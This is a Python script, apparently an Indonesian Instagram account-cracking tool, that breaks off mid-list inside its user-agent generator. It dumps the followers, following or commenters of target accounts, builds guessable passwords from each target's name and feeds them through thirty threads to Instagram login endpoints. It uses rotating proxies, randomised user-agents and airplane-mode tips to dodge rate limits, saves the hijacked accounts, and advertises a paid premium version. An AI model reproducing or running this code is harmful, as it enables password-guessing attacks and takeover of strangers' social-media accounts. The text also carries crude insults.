import urllib.parse
from urllib.parse import quote
import re, os, sys, json, random, urllib, urllib.request, hmac, hashlib, time, string, uuid, requests, base64,datetime,subprocess
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as bsp
from rich.progress import Progress,TextColumn,SpinnerColumn
from rich.panel import Panel as panel
from rich import print as cetak
from rich.console import Console
from rich.console import Console as console
from rich.table import Table
from rich.columns import Columns
from string import *
from uahngentot import Useragent
internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],["sukses"]
xx = 0
rr = random.randint;rc = random.choice
text = 'Bang+Gw+Mau+Upgrade+Script+Suys+Ke+Premium!'
# Code Warna
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
HS = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
Z = random.choice([P,M,HS,K,B,U,O,N])


Uid, Uuid = [], []
Ok, Cp, Loop = 0, 0, 0
P = "\033[97m"
I = "\033[30m"
A = "\033[90m"
K = "\033[33m"
M, K2 = K, K
H2='\033[96;1m' #HIJAU
M='\033[1;31m' #MERAH
K='\033[1;33m' #KUNING
H='\033[1;35m' #UNGU
O='\033[38;2;255;127;0;1m' #ORANGE
C='\033[0m' #CLEAR
N = '\x1b[0m' # WARNA MATI
K2= '\033[1;33m' #KUNING
getuserid = 'https://i.instagram.com/api/v1/users/web_profile_info/?username={nama!s}'
HEADERS   = {'Host': 'www.instagram.com','x-ig-app-id': '1217981644879628','x-ig-www-claim': 'hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03DgxmT','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','accept': '*/*','x-requested-with': 'XMLHttpRequest','x-asbd-id': '129477','x-csrftoken': 'TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E','sec-fetch-site': 'same-origin','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
ua = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
userinfo  = 'https://i.instagram.com/api/v1/users/{id!s}/info/'

def Fafo(cokie):
       try:
           c = re.findall('csrftoken=(.*?);',str(cokie))
           x = {"Host": "www.instagram.com","content-length": "0","x-requested-with": "XMLHttpRequest","x-csrftoken": "tJdFh5wJTuFDQZvpadl2kTm0LGRSkH8w" if len(c) == 0 else c[0],"x-ig-app-id": "936619743392459","x-instagram-ajax": "1011212827","user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36","content-type": "application/x-www-form-urlencoded","accept": "*/*","x-asbd-id": "129477","cookie":cokie}
           r = requests.post('https://www.instagram.com/api/v1/web/fxcal/ig_sso_users/', headers = x).json()
           if 'fbAccount' in str(r):
              nama = r['fbAccount']['display_name']
              Reqz = requests.get('https://accountscenter.instagram.com/profiles/', cookies = {'cookie':cokie}).text
              User = re.search('{"__typename":"XFBFXFBAccountInfo","id":"(.*?)"}', str(Reqz)).group(1)
           else:
              nama = None
              User = None
       except:
           nama = 'Requests Error!'
           User = 'Requests Error!'
       aku = '%s%s|%s'%(H,User, nama)
       return(aku)
       
       
def get_proxies():
    try:
        # Mengambil daftar proxy dari Proxyscrape
        response = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all")
        if response.ok:
            proxy_list = response.text.splitlines()
            return proxy_list
        else:
            print("Gagal mendapatkan proxy, status code:", response.status_code)
            return []
    except Exception as e:
        print(f"Gagal mendapatkan proxy, error: {e}")
        return []

sys.stdout.write('\x1b]2; SUUYS DEV GANTENG \x07')

proxy_list = get_proxies()
if proxy_list:
    # Menggunakan proxy pertama dalam daftar
    proxies = {
        'http': f'socks5://{proxy_list[0]}',
        'https': f'socks5://{proxy_list[0]}'
    }
else:
    proxies = None  # Atau Anda bisa mengatur proxy default atau handling lainnya


def Clear():
	try:
		os.system('clear')
	except:pass

def find_res(kya= []):
	try:
		if os.path.isfile('Data/OK--50.txt') is True:
			for a in open('Data/OK-50.txt','r').read().splitlines():
				xyz = re.findall('ds_user_id=(.*)',str(a))
				if len(xyz) == 0:continue
				if xyz not in meki:meki.append('ds_user_id=%s'%(xyz[0]))
		if os.path.isfile('Data/OK-100.txt') is True:
			for a in open('Data/OK-100.txt','r').read().splitlines():
				xyz = re.findall('ds_user_id=(.*)',str(a))
				if len(xyz) == 0:continue
				if xyz not in meki:meki.append('ds_user_id=%s'%(xyz[0]))
	except:pass
	if len(kya) == 0:
		for kyta in kya:
			try:
				print(f'\n{P}Login: {H}{kyta}')
				uid = re.search('ds_user_id=(\d+)', str(kyta)).group(1)
				req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=ua, cookies={'cookie':kyta}).json()['user']['full_name']
				open('Data/IG-login.txt','w').write(f'{kyta}')
				print(f'\n{P}Login sebagai : {req}')
				time.sleep(2)
				return(memek)
			except Exception as e:
				print(f'\n{P}Expired: {K}{kyta}')

def mkdir():
	try:os.mkdir('hasil')
	except:pass
    
				
def logo():
	cetak(panel(f'''[white][- code by [green]@suysaja[white] -]\n[green]┏┓┳┳┳┳┓┏┏┓  
┗┓┃┃┃┃┗┫┗┓  
┗┛┗┛┗┛┗┛┗┛  [white]\nInstagram Tools''',width=50))
				
def Aset_Ig():
	Clear()
	mkdir()
	logo()
	if os.path.isfile('Data/IG-login.txt') is True:
		coki = {'cookie':open('Data/IG-login.txt','r').read()}
	else:
		cetak(panel(f"[white][green]• [white]silahkan masukkan [green]cukis [white]instagram\n  tumbal [green]cukis [white]wajib fresh",width=50))
		raraky = {'cookie':input(f"\n cookie: {HS}")}
		print(f'{P}')
		if raraky['cookie'] == 'res':
			coki = {'cookie':find_res()}
		else:
			coki = raraky
	try:
		cek = requests.get('https://www.instagram.com/api/v1/tags/web_info/?tag_name=khmd', headers=ua,  cookies=coki).json()
		uid = re.search('ds_user_id=(\d+)', str(coki['cookie'])).group(1)
		req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=ua, cookies=coki).json()['user']
		open('Data/IG-login.txt','w').write(f'{coki["cookie"]}')
		cetak(panel(f"[white]berhasil [green]login [white]cukis id akun :[green] {uid}",width=50));time.sleep(1.0)
	except:
		os.system('rm -rf Data/IG-login.txt')
		print(f"{M} • cookies Invalid Gunakan Cookies yang Lain!{P}");time.sleep(3);Aset_Ig()
	return coki, req['full_name'], req['follower_count']

def Menu(sisa=None):
	os.system('clear')
	aset, nama, fol = Aset_Ig()
	dire = 'data/user/login'
	Clear()
	print(f"")
	logo()
	cetak(panel(f'''[white]username : {nama} [[green]account[white]]\nfollowers: {fol}\nexpired  : {sisa}[white] day [[green]key[white]]''',width=50,title="[ [green]INFO[white] ]"))
	cetak(panel(f"""[white]upgrade tools [green]premium [white]ketik [green]auth[white]""",width=50))
	cetak(panel(f'''[white][[blue]01[white]] dump followers       [white][[blue]04[white]] report bug\n[white][[blue]02[white]] dump following       [white][[blue]05[white]] dump comment\n[white][[blue]03[white]] auto comments     [white]   [[red]00[white]] out [red]cookie[white]''',width=50,title="[ [green]MENU[white] ]"))
	cetak(panel(f"[white]jika ingin cek [white]hasil [green]ok[white] ketik [green]cek [white]",width=50))
	x = input(" pilih : ")
	if x in ['01','1']:dumps(aset, True)
	elif x in ['02','2']:dumps(aset, False)
	elif x in ['4','04']:os.system("xdg-open https://wa.me/+6285697075823?text=Bang+Sc+Lu+Ada+Bug+Nih+Tolong+Di+fix")
	elif x in ['3','03']:os.system('python aw.py')
	elif x in ['00','0']:os.system("rm Data/IG-login.txt");cetak(panel(f'[white]berhasil menghapus [red]cookies[white]', width=50));exit()
	elif x in ['5','05']:cetak(panel(f'[red] menu sedang update',width=50));time.sleep(2.0);Menu()
	elif x in ['cek','cek']:cek()
	elif x in ['c','C']:exit
	elif x in ['L','l']:os.system(f'rm -rf {dire}/key.txt');cetak(panel(f'[white]berhasil menghapus [red]license[white]', width=50))
	elif x in ['t']:komentar(aset)
	elif x in ['auth']:os.system("xdg-open https://wa.me/+6289504552726?text=Bang+Mau+Upgrade+Premium+Dong+Berapa+Ya?")
	else:cetak(panel(f' [bold red]lu bisa ngetik?\n pilih yang bener memek[white]',style=f"white", width=50));time.sleep(2.0);Menu()


def cek():
    print("")
    dirs = os.listdir('hasil')
    index = 0
    for name in dirs:
        if '-' not in name or 'login' in name:pass
        else:
             index+=1
             print(' %s. hasil/%s\n'%(index, name))
             #print(' 2. hasil/buatpush.txt ')
    #print('')
    #print('\n - buatpush.txt ')
    #print('\n - Cp-Instagram.txt ')
    #print('\n salin folder hasil yang mau dicek')
    cetak(panel(f"""salin folder yang mau dicek contoh [green]\n[white][   [green]{name}   [white]]""", width=50))
    file = input(' ketik : ').split(',')
    for bx in file:
        for xv in open(bx,'r').read().splitlines():
          # print("\n")
           cetak(panel(f'\n %s\n'%(xv),width=50))
        else:ex() 

def ex():
     #print(f'\n ingin kembali ke {HS}menu{N} ketik y/{M}t{N}')
     cetak(panel(f"""ingin kembali ke [green]menu[white] ketik [green]y[white]/[red]t[white]""",width=50))
     km = input(' pilih : ')
     if km in ['y','ya']:time.sleep(1.0);Menu()
     else:exit

def komentar(cokie, dav = []):
       print('[white] masukan link postingan atau Reels\nIngin Lebih Banyak Target Komen Gunakan [[green] , [white]]\nUntuk Pemisah Contoh [[green] www.bokep.com,www.porn.com[white] ]')
       cetak(panel('[white] tekan [red]Ctrl+C[white] Jika Ingin Berhenti Mengambil Idz Target',width=50))
       link = input(f' masukkan : ').split(',')
       try:
           for ling in link:
               r = requests.get(ling, cookies=cokie).text
               o = re.search('"media_id":"(\d+)"', str(r)).group(1)
               dav.append(o)
           for x in dav:
               dump_komen(cokie, x, '')
       except:pass
       MetodeType()

def dump_komen(cokie, uid, min):
       global xx
       try:
            r = requests.get(f"https://i.instagram.com/api/v1/media/{uid}/comments/?can_support_threading=true&permalink_enabled=false&min_id={min}", cookies = cokie, headers={'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',}).json()
            for i in r['comments']:
                a = i['user']['username'] +'|'+ i['user']['full_name']
                if a not in pk_idg:
                   pk_idg.append(a)
                   xx +=1
                   print(f' Berhasil Menscan Idz Komentar [green]{len(pk_idg)}[/] Idz para target [white][/]',end='\r')
            if 'next_min_id' in str(r):
                dump_komen(cokie, uid, r['next_min_id'])
       except:pass

def dumps(cintil, typess, xyz = []):
	if 'csrftoken' not in str(cintil):
		try:
			memek = requests.get('https://www.instagram.com/data/shared_data/', cookies = cintil).json()
			token = memek['config']['csrf_token']
			cintil['cookie'] +=';csrftoken=%s;'%(token)
		except Exception as e:
			os.system('rm -rf Data/IG-login.txt')
			exit(f'\n{P}[{K}!{P}] Csrftoken tidak tersedia, dump tidak akan berjalan: {e}')
	cetak(panel(f"masukkan username, harap target tidak private",width=50))
	cetak(panel(f"[white]Tekan [red]Ctrl+C[white] Untuk Berhenti",width=50))
	#print(f"\n{P}Masukkan Username Instagram, Gunakan koma, {K}CTRL + C {P}Untuk berhenti Dump!")
	users = input(" username target : ").split(',')
	try:
		for y in users:
			req = requests.get(f'https://www.instagram.com/{y}/', cookies = cintil).text
			uid = re.search('"user_id":"(\d+)"', str(req)).group(1)
			if uid not in xyz:xyz.append(uid)
	except:pass
	try:
		mode = 'followers' if typess is True else 'following'
		for kintil in xyz:
			if typess is True:
				Graphql(True, kintil, cintil['cookie'], '')
			else:
				Graphql(False, kintil, cintil['cookie'], '')
	except:pass
	print("");MetodeType()


def Graphql(typess, userid, cokie,after):
	global xx
	api = "https://www.instagram.com/graphql/query/"
	csr = 'variables={"id":"%s","first":24,"after":"%s"}'%(userid,after)
	mek = "query_hash=58712303d941c6855d4e888c5f0cd22f&{}".format(csr) if typess is False else "query_hash=37479f2b8209594dde7facb0d904896a&{}".format(csr)
	try:
		ptk = {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","cookie": cokie}
		req = requests.get(api, params=mek, headers=ptk).json()
		if 'require_login' in req:
			if len(Uuid) > 0:
				pass
			else:
				exit(f'\n{P}[{K2}!{P}] Invalid Cookie')
		khm = 'edge_followed_by' if typess is True else 'edge_follow'
		for xyz in req['data']['user'][khm]['edges']:
			username = xyz['node']['username']
			xy = xyz['node']['username'] + '|' + xyz['node']['full_name']
			if xy not in Uuid:
				xx += 1
				Uuid.append(xy)
				print('\r • sedang mengambil {}{}{} idz target {}{}{}'.format(HS, len(Uuid), P, HS, str(username), P), end='')
				time.sleep(0.0009)
		end = req['data']['user'][khm]['page_info']['has_next_page']
		if end is True:
			after = req['data']['user'][khm]['page_info']['end_cursor']
			Graphql(typess, userid, cokie, after)
		else:pass
	except:pass

def MetodeType():
	global SistemLog
	cetak(panel(f"""[white]idz [white]berhasil didump total [green]{len(Uuid)}[white]""",width=50))
	cetak(panel(f"""[white]01. Method (Instagram web)
02. Method (Instagram app)
03. Method (Threads app) [green]Recommended[white]
04. Method (Instagram app)""",width=50))
	method = input(" pilih 01|02|03|04 : ")
	if method in ['01','1']: SistemLog = "api.instagram.com"
	elif method in ['02','2']: SistemLog = "i.instagram.com"
	elif method in ['03','3']: SistemLog = "www.instagram.com"
	elif method in ['04','4']: SistemLog = "b.i.instagram.com"
	else:time.sleep(1.1);MetodeType()
	bef()

def bef():
    cetak(panel(f'ketiklah [green]suys [white]untuk memulai crack',width=50))
    suys = input(' ketik : ')
    if suys in ['suys']:SetCrack()
    else:cetak(panel(f' [bold red] ngetik yang bener memek[white]',style=f"white", width=50));time.sleep(2.0);bef()
    
def SetCrack():
	cetak(panel(f"- Mainkan Mode [red]Pesawat[white] Setiap [green]200[white] idz -",width=50))
	cetak(panel(f"- Selamat mengcrack semoga full [green]ijoh [white]✅ -",width=50))
	with ThreadPoolExecutor (max_workers=30) as ASF:
		for i in Uuid:
			try:
				username, name = i.split('|')
				kontol = Password(name)
				if SistemLog == "api.instagram.com":
					ASF.submit(Crack_api, username, kontol)
				elif SistemLog == "i.instagram.com":
					ASF.submit(Crack_i, username, kontol)
				elif SistemLog == "www.instagram.com":
					ASF.submit(Crack_w, username, kontol)
				elif SistemLog == "b.i.instagram.com":
					ASF.submit(Crack_N, username, kontol)
			except:pass
	print('\n\n')
	time.sleep(1.1);cetak(panel(f'[white] cracking done anda telah mendapatkan\n [green]{Ok} [white]akun [green]succes [white]dan[red] {Cp}[white] akun [red]check[white]\n hasil terimpan difolder [green]/hasil/',width=50))
	print(f' \n terima kasih -{HS}suys{N}-')
	exit(' \n\n crack selah selesai\n jangan lupa bersyukur\n')
	
def Password(name):
        xxzx, ccvc = [], []
        for nama in name.split(' '):
            nama = nama.lower()
            if len(nama) <3: continue
            elif len(nama) == 3 or len(nama) == 4 or len(nama) == 5:xxzx.append(nama+'123');xxzx.append(nama+'1234');xxzx.append(nama+'12345');xxzx.append(nama+'123456789');xxzx.append(nama+'4321');xxzx.append(nama+'321');xxzx.append(nama+'06');xxzx.append(nama+'04');xxzx.append(nama+'05');xxzx.append(nama+'09');xxzx.append(nama+'03');xxzx.append(nama+'01');xxzx.append(nama+'02');xxzx.append(nama+'07');xxzx.append(nama+'08');xxzx.append(nama+'21');xxzx.append(nama.capitalize()+'123');xxzx.append(nama.capitalize()+'12345')
            else:xxzx.append(nama+'123');xxzx.append(nama+'1234');xxzx.append(nama+'12345');xxzx.append(nama+'123456789');xxzx.append(nama+'4321');xxzx.append(nama+'321');xxzx.append(nama+'06');xxzx.append(nama+'04');xxzx.append(nama+'05');xxzx.append(nama+'09');xxzx.append(nama+'03');xxzx.append(nama+'01');xxzx.append(nama+'02');xxzx.append(nama+'07');xxzx.append(nama+'08');xxzx.append(nama+'21');xxzx.append(nama.capitalize()+'123');xxzx.append(nama.capitalize()+'12345')
        return(xxzx)

def convert_cookie(item):
    try:
        sesid = 'sessionid=' + re.findall('sessionid=(\d+)', str(item))[0]
        ds_id = 'ds_user_id=' + re.findall('ds_user_id=(\d+)', str(item))[0]
        csrft = 'csrftoken=' + re.findall('csrftoken=(.*?);', str(item))[0]
        donez = '%s;%s;%s;ig_nrcb=1;dpr=2'%(ds_id, sesid, csrft)
    except Exception as e:
        donez = 'cookies tidak di temukan, error saat convert'
    return donez

ses = requests.Session()
def data_target(name):
	for y in name.split(','):
		try:
			HEADERS.update({'user-agent'  : 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)','x-ig-app-id' :'1217981644879628'})
			profil_info_target = ses.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={y}', headers = HEADERS).json()['data']['user']
			post      = profil_info_target["edge_owner_to_timeline_media"]["count"]
			peng  = profil_info_target["edge_followed_by"]["count"]
			meng = profil_info_target["edge_follow"]["count"]
			mail = profil_info_target["business_email"]
			phone = profil_info_target["business_phone_number"]
			fullname = profil_info_target["full_name"]
			fbid = profil_info_target["fbid"]
		except Exception as e:
			post, peng, meng, mail, fullname, fbid, phone = None, None, None, None, None,  None, None
	return post, peng, meng, mail, fullname, fbid, phone

def UserAgent():
	andro=rc(['24/7.0','26/8.0.0','23/6.0.1','22/5.1.1','21/5.0.1','21/5.0.2','25/7.1.1','19/4.4.4','21/5.0','19/4.4.2','27/8.1.0','28/9','29/10','26/9','29/10','30/11','25/7.1.2'])
	dpis=rc(['320dpi','640dpi','213dpi','480dpi','420dpi','240dpi','280dpi','160dpi','560dpi','540dpi','272dpi','360dpi','720dpi','270dpi','450dpi','600dpi','279dpi','210dpi','180dpi','510dpi','300dpi','454dpi','314dpi','288dpi','401dpi','153dpi','267dpi','345dpi','493dpi','340dpi','604dpi','465dpi','680dpi','256dpi','290dpi','432dpi','273dpi','120dpi','200dpi','367dpi','419dpi','306dpi','303dpi','411dpi','195dpi','518dpi','230dpi','384dpi','315dpi','293dpi','274dpi','235dpi'])
	pxl = rc(['720x1280','1440x2560','1440x2768','1280x720','1280x800','1080x1920','540x960','1080x2076','1080x2094','1080x2220','480x800','768x1024','1440x2792','1200x1920','720x1384','1920x1080','720x1369','800x1280','720x1440','1080x2058','600x1024','720x1396','2792x1440','1920x1200','2560x1440','1536x2048','720x1382','1080x2113','1080x2198','1080x2131','720x1423','1080x2069','720x1481','1080x2047','1080x2110','1080x2181','1080x2209','1080x2180','1080x2020','1080x2095','1440x2723','1080x2175','720x1365','1440x2699','1080x2218','2699x1440','1440x2907','1080x2257','720x1370','1080x2042','720x1372','1080x2200','1080x2186','720x1361','1080x2024','1080x2006','720x1402','1440x2831','720x1454','1080x2064','1440x2933','720x1411','720x1450','1440x2730','1080x2046','2094x1080','540x888','1440x2759','1080x2274','1080x2178','1440x2706','720x1356','720x1466','1440x2900','2560x1600','1080x2038','1600x2452','1080x2129','720x1422','720x1381','1080x2183','1080x2285','800x1216','1080x2216','1080x2168','1080x2119','1080x2128','1080x2273','2274x1080','1080x2162','1080x2164','2076x1080','1024x768','1080x2173','1440x2845','1080x2134','720x1379','1440x2838','1080x2139','2131x1080','1440x2744','1080x2192','720x1406','1440x2960','1080x2029','2042x1080','1080x2212','1406x720','1080x2288','2047x1080','1080x2051','720x1398','1280x736','1382x720','720x1353','1080x2050','1080x2028','1080x2256','2711x1440','2175x1080','1080x2281','2560x1492','1440x2923','1200x1845','1080x2189','1080x2002','1440x2711','2110x1080','960x540','1080x2033','2200x1080','720x1452','720x1480','1440x2735','720x1472','1080x2277','1080x2169','2874x1440','1600x2560','1080x2151','2218x1080','1080x2182','720x1468','1440x2898','1080x2011','1080x2201','720x1380','1080x2287','2069x1080','1200x1836','2046x1080','720x1439','2058x1080','2182x1080','720x1399','1080x2282','1440x2721','1080x2324','720x1432','1080x2165','1080x2150','1080x2156','1080x1872','1440x3048','1532x2560','720x1355','720x1390','720x1476','720x1410','1080x2032','720x1437','1440x2682','1440x2921','1080x2270','1080x2160','720x1446','1200x1848','1440x2874','1080x2309','1080x2174','1440x2867','1080x2060','1080x2196','1080x2401','1536x1922','1080x2280','1080x2123','720x1435','1440x2927','1080x2276','720x1448','720x1469','720x1344','1080x2187','540x937','1440x3028','1080x2184','1440x2718','1080x2326','840x1834','1440x2935','1440x2880','1440x2892','2048x2048','1080x2195','1080x2322','720x1419','987x1450','1080x2092','1440x3047','720x1358','1080x2136','720x1357','1080x2093','720x1477','1080x2312','1080x2361','720x1341','720x1507','1080x2172','720x1337','1080x2177','1080x2125','1440x2891','1600x2434','720x1394','1080x2159','720x1387','1080x2166','1080x2154','1080x2147','1440x2747','1080x2105','1440x2911','720x1473','1080x2055','1080x2265','720x1436','1080x2190','1600x2526','720x1373','720x1415','1080x2249','1080x2254','720x1455','1440x3040','1080x2149','720x1385','1440x3036','1080x2111','1440x2904','720x1442','720x1377','1080x2307','1080x2327','1080x2141','1080x2025','720x1430','720x1375','1080x2283','1440x2779','1080x2321','1080x2268','1440x2758','1752x2698','1080x2267','1200x1856','1440x2756','720x1464','1080x2234','1080x2171','1080x2155','720x1463','1080x2122','720x1467','1080x2264','720x1349','1440x2999','720x1458','1080x2015','720x1431','1242x2208','1080x2185','1080x2148','1080x2163','1440x2780','720x1445','1080x2146','1200x1916','720x1502','1200x1928','720x1506','720x1424','720x1465','720x1420','1080x2176','720x1521','1080x2315','1080x2400','720x1471','1080x2157','1600x2458','1080x2067','1080x2191','1080x2271','720x1407','800x1208','1080x2087','1080x2199','578x1028','720x1485','540x879','1080x2179','720x1555','810x1598','720x1378','1200x1897','720x1395','720x1459','900x1600','1080x2275','1440x2733'])
	basa = rc(['ru_RU','en_GB','uk_UA','en_US','de_DE','it_IT','ru_UA','ar_AE','tr_TR','lv_LV','th_TH','fr_FR','sr_RS','hu_HU','bg_BG','pt_PT','pt_BR','es_ES','en_IE','nl_NL','fr_CH','de_CH','es_US','fr_CA','ru_BY','en_PH','en_AU','hy_AM','fa_IR','de_AT','cs_CZ','ru_KZ','en_CA','fr_BE','az_AZ','en_NZ','en_ZA','es_LA','ru_KG','pl_PL','es_MX','ro_RO','el_GR','iw_IL','in_ID','ga_IE','en_IN','ar_SA','ka_GE','es_CO','es_SV','hr_HR','ar_JO','es_PE','it_SM','ar_AR','en_SE','nb_NO','sk_SK','bs_BA','nl_BE','uz_UZ','sl_SI','es_CL'])
	kode = rc(['104766893','104766900','102221278','104766888','105842053','93117670','94080607','96794592','102221279','100986894','ru_RU','94080606','103516660','98288242','103516666','103516653','uk_UA','96794590','100986893','102221277','95414344','99640920','99640911','96794591','ru_UA','99640905','100986890','107092313','99640900','93117667','100521966','90841939','98288239','89867440','105842051','de_DE','96794584','105842050','en_US','pt_PT','109556223','107092318','en_GB','108357722','112021130','107092322','119104798','108357720','119104802','112021131','100986892','113249569','107104231','fr_FR','pt_BR','109556226','116756948','113249553','113249561','110937441','118342010','120662545','117539703','119875222','110937448','121451799','115994877','108357718','120662547','107608058','122206624','95414346','107092308','112021128','90841948','119875229','117539698','120662550','en_NZ','123103748','91882538','121451810','91882537','118342006','113948109','122338251','110937453','es_US','118342005','121451793','109556219','119875225','en_CA','109556220','117539695','115211358','91882539','119104795','89867442','94080603','164094539','175574628','185203690','188791648','188791674','187682694','188791643','177770724','192992577','180322810','195435560','196643820','196643821','188791637','192992576','196643799','196643801','196643803','195435546','194383411','197825254','197825260','197825079','171727793','197825112','197825012','197825234','179155086','192992563','197825268','166149669','192992565','198036424','197825223','183982969','199325909','199325886','199325890','199325911','197825118','127049003','197825169','197825216','197825127','200395960','179155096','199325907','200396014','188791669','197825133','170693926','200396005','171727780','201577064','201576758','201577192','201775949','201576944','201775970','143631574','126223520','201775951','167338518','144612598','170693940','201775813','200395971','201775744','201775946','202766609','145652094','202766591','202766602','203083142','179155088','202766608','199325884','180322802','202766603','195435547','165030894','201576967','201775904','194383424','197347903','202766610','185203693','201576898','204019468','187682682','204019456','201775901','204019471','204019454','204019458','202766601','204019452','173238721','204019466','148324036','202766581','158441904','201576903','205280538','205280529','201576813','173238729','141753096','205280531','163022072','201576887','163022088','141753091','148324051','205280528','154400383','205280537','201576818','157405371','205858383','201576811','165031093','187682684','145652090','206670917','185203686','192992561','183982986','206670927','150338061','183982962','127049016','175574603','155374054','205858247','135374896','206670920','169474958','206670926','160497905','161478672','192992578','206670929','131223243','206670916','142841919','187682681','171727795','151414277','206670922','160497915','207505137','165030898','208061741','208061688','208180365','208061674','197825052','147375133','208061744','196643798','208061725','122338247','157536430','208061728','209143963','208727155','209143726','205280539','209143903','209143970','181496409','208061739','209143957','210180522','210180512','209143881','209143712','180322805','210180521','195435561','210370119','210180523','210180493','175574596','210180510','210180480','210180513','210180517','176649504','177770663','210180479','211114117','210908379','206670921','211114134','183982943','211399345','211399342','211399332','201775962','211574187','211574249','210180519','167338559','185203649','124583960','211399337','211399335','197825163','166149717','211399336','212063371','211399329','209143954','210180482','168361634','212214017','209143867','211399341','211399340','212214027','195435510','122338243','139237670','152367502','212676872','212676898','212676875','212676895','212676901','209823384','212676869','196643822','212676878','213367980','213368005','212676886','213558743','209143913','212214039','158441917','174081672','213558750','201775966','188791681','185203705','143631575','161478664','214245350','161478663','212676881','213558770','214245346','138226752','214245221','214245182','214245206','214245218','214245354','214245295','214245199','214245304','214245280','214446313','214245187','214245288','214139002','202766605','214245319','214646783','158441914','215246048','195435544','208061677','215464400','128676146','215464389','215464385','215464390','215464398','182747397','215464393','216233197','201775791','216817344','215464395','216817286','185203642','164094529','216817305','215464401','162439029','215464382','216817280','216817331','214330969','216817299','216817357','217948981','217948980','217948956','217948959','217948968','216817296','217948952','217948982','216817269','219308759','219308726','182747387','219308721','219308754','219308763','176649435','183982982','219909486','127049038','219308730','221134012','221134032','221134009','221134037','194383426','221134029','221134005','221134018','145652093','225283632','165031108','225283625','224652582','139906580','225283628','225283624','226142579','225283634','225283631','226493211','225283623','185203672','156514151','218793478','225283621','227299063','225283627','227299064','227299021','227299027','227544546','227299041','227299060','227299012','228970707','228970705','227299005','228970687','228970683','228970694','228970710','228970689','160497904','195435540','129611419','229783842','230291708','228970681','148324047','230877709','231192211','230877674','230877705','230877678','211399328','209143896','230877713','194383428','230877689','221134002','231457747','208061721','230877671','230877668','232868027','232088496','185203706','232868005','232867964','232868001','232868015','232868031','232867959','232868009','164094526','232867941','234041364','182747399','232868024','232867949','234847239','234847238','234847234','162439040','234847229','234847230','181496427','234847240','232867993','195435558','232867967','232867997','234847227','235871830','221133998','236572344','236572377','153386780','236572337','236572349','236572372','234847226','236572383','237507050','238093993','238093948','238093954','238093999','238093982','239490565','239490555','238093946','238093966','239490563','239490550','239974660','240726416','239490568','240726484','240726452','239490551','239490548','240726426','240726476','240726491','240726471','241043882','241114613','236572331','241267273','240726407','241456456','241267278','241267269','241114619','241456445','241456451','242168941','242168928','242168931','242168939','242168925','240726436','242375239','144722090','242168935','242290370','157405369','242168933','242290355','242703240','242807362','242168923','242168943','242991209','243646252','243646269','242991200','243711120','243646267','243711093','243975802','243646263','243646248','243646255','244167578','128676156','194383413','243975835','244390417','244390338','245196084','245196061','240726392','245196055','243646273','245196082','245196063','245196070','245666450','245466705','245870319','245870301','245870347','245196087','246889064','246889072','246889073','246889074','246889065','247146500','246889063','245870262','247370962','247146481','246889068','246889062','247541884','247541831','247370955','247370942','247720736','247720751','248310216','248310220','248310208','247720744','248399342','248310210','247720747','248310206','248717751','248310212','248310221','248823392','248583561','248310205','248899028','248955251','248955247','249178904','248955244','249507608','249507582','249507588','249507585','248955240','249507607','249507592','249810008','249966137','249507610','249966081','249966100','249507599','249966140','249810004','123790722','250188776','249628096','250188788','250742103','250742113','250742102','250877984','250742105','250742111','251048681','250742107','250742115','251048695','251304696','251304682','251524431','251530710','251304689','251524420','251524409','251524390','250742101','251048673','252055918','252055945','251920416','252055944','252055925','252239038','252055936','252055915','252055948','252390568','252390583','252580134','252740497','252740485','252740490','253120615','253325372','253325384','253325385','253447816','253146263','253120607','253325374','253120598','253325371','253447808','253447809','253325378','253447814','253447807','253447811','253447817','253447813','181496411','253447806','255191971','255013798','255777478','255777471','255777474','255777472','255959637','255777477','255959614','255959635','256099199','256099204','150338064','256099153','256099205','256099156','255983744','256107300','255777470','126223536','256203326','256099190','256099151','256324061','256324047','256203339','256966628','256966589','256966626','256966590','124584015','257456576','256966593','257456590','256966629','256966587','256966592','257456586','257456539','259829115','259829104','259829113','260037038','259829105','259829109','260037030','260149625','259829103','260149621','260465044','259829116','260724710','179155058','261079769','261079761','261079768','261079762','261079771','261276939','157405370','135374885','261079765','261393056','261393062','261079760','181496406','182747360','261504698','261690888','261504706','169474957','262218766','262290715','262290774','262372432','262372425','262372431'